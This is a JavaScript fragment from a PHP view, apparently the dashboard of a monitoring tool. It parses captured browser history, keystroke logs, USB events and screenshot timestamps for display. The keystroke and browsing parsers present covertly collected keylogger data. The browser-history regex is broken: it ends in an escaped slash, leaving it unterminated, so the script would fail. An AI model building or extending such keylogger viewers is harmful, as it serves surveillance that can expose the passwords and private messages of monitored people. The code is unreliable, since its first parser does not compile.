function parseBrowserHistory(lines) {
    const headers = ['Date', 'Browser', 'URL', 'Title'];
    const data = [];
    
    console.log("Parsing browser history lines:", lines.length);
    if (lines.length > 0) {
        console.log("Sample browser history line:", lines[0]);
    }
    
    lines.forEach((line, index) => {
        // Parse format: Date: 2025-07-12 17:31:46 | Browser: Chrome | URL: https://... | Title: ... | Last Visit: ...
        const match = line.match(/Date: (.+?) \| Browser: (.+?) \| URL: (.+?) \| Title: (.+?) \/);
        if (match) {
            data.push({
                date: match[1].trim(),
                browser: match[2].trim(),
                url: match[3].trim(),
                title: match[4].trim()
            });
        } else {
            // Try alternative format: Date: ... | URL: ... | Title: ...
            const altMatch = line.match(/Date: (.+?) \| URL: (.+?) \| Title: (.+)/);
            if (altMatch) {
                data.push({
                    date: altMatch[1].trim(),
                    browser: 'Unknown',
                    url: altMatch[2].trim(),
                    title: altMatch[3].trim()
                });
            } else {
                // Fallback: treat as generic line
                console.log(`Could not parse browser history line ${index + 1}:`, line);
                data.push({
                    date: new Date().toLocaleString(),
                    browser: 'Unknown',
                    url: line,
                    title: 'Unknown'
                });
            }
        }
    });
    
    console.log("Parsed browser history entries:", data.length);
    if (data.length > 0) {
        console.log("Sample parsed browser entry:", data[0]);
    }
    return { data, headers };
}

function parseKeyLogs(lines) {
    const headers = ['Date', 'Application', 'Key', 'Action'];
    const data = [];
    
    console.log("Parsing key logs lines:", lines.length);
    if (lines.length > 0) {
        console.log("Sample key log line:", lines[0]);
    }
    
    lines.forEach((line, index) => {
        // Try multiple formats for key logs
        let match = line.match(/Date: (.+?) \| Application: (.+?) \| Key: (.+?) \| Action: (.+)/);
        
        if (!match) {
            // Try alternative format: Date: ... | Key: ... | Action: ...
            match = line.match(/Date: (.+?) \| Key: (.+?) \| Action: (.+)/);
            if (match) {
                data.push({
                    date: match[1].trim(),
                    application: 'Unknown',
                    key: match[2].trim(),
                    action: match[3].trim()
                });
                return;
            }
        }
        
        if (!match) {
            // Try format: Date: ... | Application: ... | Key: ...
            match = line.match(/Date: (.+?) \| Application: (.+?) \| Key: (.+)/);
            if (match) {
                data.push({
                    date: match[1].trim(),
                    application: match[2].trim(),
                    key: match[3].trim(),
                    action: 'Unknown'
                });
                return;
            }
        }
        
        if (!match) {
            // Try simple format: Date: ... | Key: ...
            match = line.match(/Date: (.+?) \| Key: (.+)/);
            if (match) {
                data.push({
                    date: match[1].trim(),
                    application: 'Unknown',
                    key: match[2].trim(),
                    action: 'Unknown'
                });
                return;
            }
        }
        
        if (!match) {
            // Try to extract any date and key information using flexible regex
            const dateMatch = line.match(/Date:\s*([^|]+)/);
            const keyMatch = line.match(/Key:\s*([^|]+)/);
            const appMatch = line.match(/Application:\s*([^|]+)/);
            const actionMatch = line.match(/Action:\s*([^|]+)/);
            
            if (dateMatch || keyMatch || appMatch || actionMatch) {
                data.push({
                    date: dateMatch ? dateMatch[1].trim() : new Date().toLocaleString(),
                    application: appMatch ? appMatch[1].trim() : 'Unknown',
                    key: keyMatch ? keyMatch[1].trim() : 'Unknown',
                    action: actionMatch ? actionMatch[1].trim() : 'Unknown'
                });
                return;
            }
        }
        
        if (match) {
            data.push({
                date: match[1].trim(),
                application: match[2].trim(),
                key: match[3].trim(),
                action: match[4].trim()
            });
        } else {
            // Fallback: treat as generic line
            console.log(`Could not parse key log line ${index + 1}:`, line);
            data.push({
                date: new Date().toLocaleString(),
                application: 'Unknown',
                key: 'Unknown',
                action: line
            });
        }
    });
    
    console.log("Parsed key log entries:", data.length);
    if (data.length > 0) {
        console.log("Sample parsed entry:", data[0]);
    }
    return { data, headers };
}

function parseUsbLogs(lines) {
    const headers = ['Date', 'Device', 'Action', 'Details'];
    const data = [];
    
    lines.forEach(line => {
        // Parse format: Date: 2025-07-12 17:31:46 | Device: USB Flash Drive | Action: Connected | Details: ...
        const match = line.match(/Date: (.+?) \| Device: (.+?) \| Action: (.+?) \| Details: (.+) /);
        if (match) {
            data.push({
                date: match[1].trim(),
                device: match[2].trim(),
                action: match[3].trim(),
                details: match[4].trim()
            });
        } else {
            // Try alternative format: Date: ... | Device: ... | Action: ...
            const altMatch = line.match(/Date: (.+?) \| Device: (.+?) \| Action: (.+)/);
            if (altMatch) {
                data.push({
                    date: altMatch[1].trim(),
                    device: altMatch[2].trim(),
                    action: altMatch[3].trim(),
                    details: 'No details'
                });
            } else {
                // Fallback: treat as generic line
                data.push({
                    date: new Date().toLocaleString(),
                    device: 'Unknown',
                    action: 'Unknown',
                    details: line
                });
            }
        }
    });
    
    return { data, headers };
}

function parseGenericLog(lines) {
    const headers = ['Line', 'Content'];
    const data = [];
    
    lines.forEach((line, index) => {
        data.push({
            line: index + 1,
            content: line
        });
    });
    
    return { data, headers };
}

function parseScreenshotTime(val) {
    if (!val) return null;
    if (typeof val === 'number') {
        // Assume UNIX timestamp (seconds or ms)
        if (val > 1e12) return new Date(val); // ms
        return new Date(val * 1000); // s
    }
    if (typeof val === 'string') {
        // Try ISO first
        let d = new Date(val);
        if (!isNaN(d.getTime())) return d;
        // Try replacing space with T
        d = new Date(val.replace(' ', 'T'));
        if (!isNaN(d.getTime())) return d;
        // Try Date.parse
        const t = Date.parse(val);
        if (!isNaN(t)) return new Date(t);
    }
    return null;
}
</script>
<?php
$content = ob_get_clean();
include BASEPATH . 'app/views/layouts/main.php';
?> 